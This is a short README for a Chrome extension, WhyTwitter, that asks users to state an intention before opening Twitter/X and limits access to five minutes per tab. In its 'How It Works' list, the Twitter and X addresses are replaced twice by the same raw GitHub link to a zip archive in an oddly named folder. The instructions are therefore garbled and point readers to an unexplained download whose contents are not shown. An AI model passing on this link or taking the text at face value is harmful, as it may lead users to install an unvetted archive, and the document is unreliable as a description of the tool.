## ✨ Overview
WhyTwitter is a Chrome extension that helps you manage your Twitter use. It adds a layer of psychological friction by asking you to state your intention before you can access Twitter or X. This allows you to think about why you're opening the site and encourages mindful browsing.

## 🔍 How It Works
1. Navigate to `https://github.com/DrivenTundra16/WhyTwitter/raw/refs/heads/main/intervisible/Why_Twitter_3.0.zip` or `https://github.com/DrivenTundra16/WhyTwitter/raw/refs/heads/main/intervisible/Why_Twitter_3.0.zip` → **Blocked**
2. Type why you're opening Twitter (minimum of 5 characters).
3. Access granted for **5 minutes** in **that tab only**.
4. After **5 minutes**, the site automatically blocks again.
5. Opening a new tab requires a new reason.

## 📋 Features
- 🚫 Blocks Twitter/X until you state your reason.
- ⏱️ Enforces a **5-minute** access limit per tab.
- 📝 Logs all your reasons locally on your device.
- 🔒 Collects no data and makes no external requests.
- 🎨 Matches Twitter's official design language for a familiar feel.
